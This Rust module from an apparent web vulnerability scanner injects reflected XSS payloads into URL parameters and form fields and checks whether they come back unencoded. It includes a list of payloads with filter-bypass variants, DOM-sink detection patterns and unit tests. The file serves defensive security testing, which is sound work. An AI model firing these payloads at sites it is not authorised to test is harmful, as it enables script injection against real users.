// Allow unused code for internal constants and helper functions
#![allow(dead_code)]

use anyhow::Result;
use log::debug;
use reqwest::Client;
use url::Url;
use rand::Rng;

use crate::types::{WebAppFinding, FindingType, Severity};
use super::forms::FormData;

/// Generate XSS test payloads with unique markers
fn generate_xss_payloads() -> Vec<String> {
    let marker: String = rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(8)
        .map(char::from)
        .collect();

    vec![
        // Basic script injection
        format!("<script>alert('{}')</script>", marker),
        // Event handler payloads
        format!("<img src=x onerror=alert('{}')>", marker),
        format!("<svg/onload=alert('{}')>", marker),
        format!("<body onload=alert('{}')>", marker),
        format!("<input onfocus=alert('{}') autofocus>", marker),
        format!("<details open ontoggle=alert('{}')>", marker),
        format!("<marquee onstart=alert('{}')>", marker),
        // Attribute breakout
        format!("'\"><script>alert('{}')</script>", marker),
        format!("'onmouseover='alert(\"{}\")' x='", marker),
        // JavaScript protocol
        format!("javascript:alert('{}')", marker),
        format!("<iframe src=javascript:alert('{}')>", marker),
        format!("<a href=\"javascript:alert('{}')\">click</a>", marker),
        // Encoded variants
        format!("%3Cscript%3Ealert('{}')%3C/script%3E", marker),
        // Filter bypass - nested tags
        format!("<scr<script>ipt>alert('{}')</scr</script>ipt>", marker),
        // Data URI payload
        format!("<object data=\"data:text/html,<script>alert('{}')</script>\">", marker),
        // Template literal injection (modern JS)
        format!("${{alert('{}')}}", marker),
    ]
}

/// Additional DOM-based XSS patterns for detection
const DOM_XSS_PATTERNS: &[&str] = &[
    "document.write(",
    "document.writeln(",
    "innerHTML",
    "outerHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "document.cookie",
    "window.location",
    "location.href",
    "location.hash",
    "location.search",
];

/// Test for reflected XSS vulnerabilities
pub async fn test_xss(
    client: &Client,
    urls: &[Url],
    forms: &[FormData],
) -> Result<Vec<WebAppFinding>> {
    let mut findings = Vec::new();

    // Generate payloads
    let payloads = generate_xss_payloads();

    // Test URL parameters
    for url in urls {
        if url.query().is_some() {
            debug!("Testing XSS in URL parameters: {}", url);
            if let Some(xss_findings) = test_url_params(client, url, &payloads).await? {
                findings.extend(xss_findings);
            }
        }
    }

    // Test form inputs
    for form in forms {
        debug!("Testing XSS in form: {}", form.url);
        if let Some(xss_findings) = test_form_inputs(client, form, &payloads).await? {
            findings.extend(xss_findings);
        }
    }

    Ok(findings)
}

/// Test URL parameters for XSS
async fn test_url_params(
    client: &Client,
    url: &Url,
    payloads: &[String],
) -> Result<Option<Vec<WebAppFinding>>> {
    let mut findings = Vec::new();

    // Parse query parameters
    let params: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();

    for (param_name, _original_value) in &params {
        for payload in payloads {
            let mut modified_url = url.clone();

            // Replace the parameter value with the payload
            let new_query = params
                .iter()
                .map(|(k, v)| {
                    if k == param_name {
                        format!("{}={}", k, urlencoding::encode(payload))
                    } else {
                        format!("{}={}", k, urlencoding::encode(v))
                    }
                })
                .collect::<Vec<_>>()
                .join("&");

            modified_url.set_query(Some(&new_query));

            // Send request with payload
            match client.get(modified_url.as_str()).send().await {
                Ok(response) => {
                    let response_text = response.text().await.unwrap_or_default();

                    // Check if payload is reflected in response
                    if is_payload_reflected(&response_text, payload) {
                        findings.push(WebAppFinding {
                            finding_type: FindingType::CrossSiteScripting,
                            url: url.to_string(),
                            parameter: Some(param_name.clone()),
                            evidence: format!(
                                "XSS payload reflected in response for parameter '{}': {}",
                                param_name, payload
                            ),
                            severity: Severity::High,
                            remediation: "Implement proper output encoding/escaping for all user input displayed in HTML. Use context-aware encoding (HTML, JavaScript, URL, CSS). Implement Content-Security-Policy header. Consider using a templating engine with auto-escaping.".to_string(),
                        });
                        break; // One finding per parameter
                    }
                }
                Err(e) => {
                    debug!("Request failed with XSS payload in parameter '{}': {}", param_name, e);
                }
            }

            // Rate limiting
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }

    if findings.is_empty() {
        Ok(None)
    } else {
        Ok(Some(findings))
    }
}

/// Test form inputs for XSS
async fn test_form_inputs(
    client: &Client,
    form: &FormData,
    payloads: &[String],
) -> Result<Option<Vec<WebAppFinding>>> {
    let mut findings = Vec::new();

    // Prepare baseline params
    let baseline_params: Vec<(String, String)> = form
        .inputs
        .iter()
        .map(|input| {
            let value = input.value.clone().unwrap_or_else(|| "test".to_string());
            (input.name.clone(), value)
        })
        .collect();

    // Test each input field
    for input in &form.inputs {
        // Skip hidden fields and CSRF tokens
        if input.input_type == "hidden" || input.name.to_lowercase().contains("csrf") {
            continue;
        }

        for payload in payloads {
            let mut test_params = baseline_params.clone();

            // Replace the input value with the payload
            if let Some(param) = test_params.iter_mut().find(|(k, _)| k == &input.name) {
                param.1 = payload.clone();
            }

            // Submit form based on method
            let response_result = if form.method == "POST" {
                client.post(&form.action).form(&test_params).send().await
            } else {
                // GET method - construct URL with query params
                let query_string = test_params
                    .iter()
                    .map(|(k, v)| format!("{}={}", k, urlencoding::encode(v)))
                    .collect::<Vec<_>>()
                    .join("&");

                let url_with_params = if form.action.contains('?') {
                    format!("{}&{}", form.action, query_string)
                } else {
                    format!("{}?{}", form.action, query_string)
                };

                client.get(&url_with_params).send().await
            };

            match response_result {
                Ok(response) => {
                    let response_text = response.text().await.unwrap_or_default();

                    // Check if payload is reflected
                    if is_payload_reflected(&response_text, payload) {
                        findings.push(WebAppFinding {
                            finding_type: FindingType::CrossSiteScripting,
                            url: form.url.clone(),
                            parameter: Some(input.name.clone()),
                            evidence: format!(
                                "XSS payload reflected in form response for input '{}': {}",
                                input.name, payload
                            ),
                            severity: Severity::High,
                            remediation: "Implement proper output encoding for all user input. Use context-aware escaping (HTML entities, JavaScript escaping, URL encoding). Set Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies.".to_string(),
                        });
                        break;
                    }
                }
                Err(e) => {
                    debug!("Form submission failed with XSS payload in field '{}': {}", input.name, e);
                }
            }

            // Rate limiting
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }

    if findings.is_empty() {
        Ok(None)
    } else {
        Ok(Some(findings))
    }
}

/// Check if XSS payload is reflected in the response
fn is_payload_reflected(response: &str, payload: &str) -> bool {
    // Check for exact match
    if response.contains(payload) {
        return true;
    }

    // Check for common encoded variants
    let html_encoded = html_escape::encode_text(payload);
    if response.contains(&*html_encoded) {
        return false; // Properly encoded, not vulnerable
    }

    // Check for partial matches (tags might be stripped but content remains)
    // Extract the unique marker from payload
    if let Some(start) = payload.find("alert('") {
        if let Some(end) = payload[start + 7..].find('\'') {
            let marker = &payload[start + 7..start + 7 + end];
            if response.contains(marker) && response.contains("<script>") {
                return true;
            }
        }
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    // ==================== is_payload_reflected Tests ====================

    #[test]
    fn test_payload_reflected_exact_match() {
        let response = r#"<html><body><script>alert('test')</script></body></html>"#;
        let payload = "<script>alert('test')</script>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_html_encoded_safe() {
        let response = r#"<html><body>&lt;script&gt;alert('test')&lt;/script&gt;</body></html>"#;
        let payload = "<script>alert('test')</script>";
        // HTML encoded response is safe
        assert!(!is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_not_reflected() {
        let response = r#"<html><body>Welcome user</body></html>"#;
        let payload = "<script>alert('test')</script>";
        assert!(!is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_img_tag() {
        let response = r#"<html><body><img src=x onerror=alert('abc123')></body></html>"#;
        let payload = "<img src=x onerror=alert('abc123')>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_svg_tag() {
        let response = r#"<html><body><svg/onload=alert('test123')></body></html>"#;
        let payload = "<svg/onload=alert('test123')>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_iframe_tag() {
        let response = r#"<html><body><iframe src=javascript:alert('xss')></body></html>"#;
        let payload = "<iframe src=javascript:alert('xss')>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_body_onload() {
        let response = r#"<html><body onload=alert('test')>Content</body></html>"#;
        let payload = "<body onload=alert('test')>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_input_autofocus() {
        let response = r#"<html><body><input onfocus=alert('test') autofocus></body></html>"#;
        let payload = "<input onfocus=alert('test') autofocus>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_in_attribute() {
        let response = r#"<html><body><div class="'\"><script>alert('marker')</script>">Content</div></body></html>"#;
        let payload = "'\"><script>alert('marker')</script>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_with_marker_and_script() {
        let response = r#"<html><body><script>var x = 'MARKER123';</script></body></html>"#;
        let payload = "<script>alert('MARKER123')</script>";
        // This should detect the marker within a script tag
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_not_reflected_partial_marker() {
        let response = r#"<html><body>MARKER but no script tags here</body></html>"#;
        let payload = "<script>alert('MARKER')</script>";
        // Marker present but no script tag
        assert!(!is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_empty_response() {
        let response = "";
        let payload = "<script>alert('test')</script>";
        assert!(!is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_empty_payload() {
        let response = "<html><body>Content</body></html>";
        let payload = "";
        // Empty payload technically "exists" in any response (contains returns true)
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_partial_encoding_still_dangerous() {
        // Only some characters encoded, still vulnerable
        let response = r#"<html><body><script>alert('test')</script></body></html>"#;
        let payload = "<script>alert('test')</script>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_double_encoding_safe() {
        // Double-encoded content is safe
        let response = r#"<html><body>%26lt%3Bscript%26gt%3Balert('test')%26lt%3B/script%26gt%3B</body></html>"#;
        let payload = "<script>alert('test')</script>";
        assert!(!is_payload_reflected(response, payload));
    }

    // ==================== generate_xss_payloads Tests ====================

    #[test]
    fn test_generate_xss_payloads_not_empty() {
        let payloads = generate_xss_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.len() >= 5);
    }

    #[test]
    fn test_generate_xss_payloads_unique_markers() {
        let payloads1 = generate_xss_payloads();
        let payloads2 = generate_xss_payloads();
        // Different invocations should have different markers (random)
        assert_ne!(payloads1[0], payloads2[0]);
    }

    #[test]
    fn test_generate_xss_payloads_contains_script_tag() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("<script>")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_img_tag() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("<img")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_svg_tag() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("<svg")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_iframe_tag() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("<iframe")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_event_handlers() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("onerror")));
        assert!(payloads.iter().any(|p| p.contains("onload")));
        assert!(payloads.iter().any(|p| p.contains("onfocus")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_javascript_protocol() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("javascript:")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_attribute_escape() {
        let payloads = generate_xss_payloads();
        // Check for attribute-breaking payloads
        assert!(payloads.iter().any(|p| p.contains("'\"")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_encoded_variants() {
        let payloads = generate_xss_payloads();
        // Check for URL-encoded payloads
        assert!(payloads.iter().any(|p| p.contains("%3C")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_tag_splitting() {
        let payloads = generate_xss_payloads();
        // Check for filter bypass payloads (nested tags)
        assert!(payloads.iter().any(|p| p.contains("<scr<script>")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_details_tag() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("<details")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_marquee_tag() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("<marquee")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_anchor_tag() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("<a href")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_data_uri() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("data:text/html")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_template_literal() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("${")));
    }

    #[test]
    fn test_generate_xss_payloads_contains_onmouseover() {
        let payloads = generate_xss_payloads();
        assert!(payloads.iter().any(|p| p.contains("onmouseover")));
    }

    #[test]
    fn test_generate_xss_payloads_marker_length() {
        let payloads = generate_xss_payloads();
        // Each payload should contain an 8-character marker
        for payload in &payloads {
            if payload.contains("alert('") {
                // Extract marker between alert(' and ')
                if let Some(start) = payload.find("alert('") {
                    if let Some(end) = payload[start + 7..].find('\'') {
                        let marker = &payload[start + 7..start + 7 + end];
                        assert_eq!(marker.len(), 8, "Marker should be 8 characters");
                        assert!(marker.chars().all(|c| c.is_ascii_alphanumeric()), "Marker should be alphanumeric");
                    }
                }
            }
        }
    }

    // ==================== Edge Case Tests ====================

    #[test]
    fn test_payload_reflected_case_sensitive() {
        // XSS detection should be case-sensitive for exact matches
        let response = r#"<html><body><SCRIPT>alert('test')</SCRIPT></body></html>"#;
        let payload = "<script>alert('test')</script>";
        // Uppercase tags should not match lowercase payload exactly
        assert!(!is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_in_json_response() {
        let response = r#"{"name": "<script>alert('test')</script>", "status": "ok"}"#;
        let payload = "<script>alert('test')</script>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_reflected_in_xml_response() {
        let response = r#"<?xml version="1.0"?><data><name><script>alert('test')</script></name></data>"#;
        let payload = "<script>alert('test')</script>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_with_newlines() {
        let response = "<html><body>\n<script>\nalert('test')\n</script>\n</body></html>";
        let payload = "<script>\nalert('test')\n</script>";
        assert!(is_payload_reflected(response, payload));
    }

    #[test]
    fn test_payload_with_unicode() {
        let response = r#"<html><body><script>alert('\u0048\u0065\u006c\u006c\u006f')</script></body></html>"#;
        let payload = r#"<script>alert('\u0048\u0065\u006c\u006c\u006f')</script>"#;
        assert!(is_payload_reflected(response, payload));
    }
}
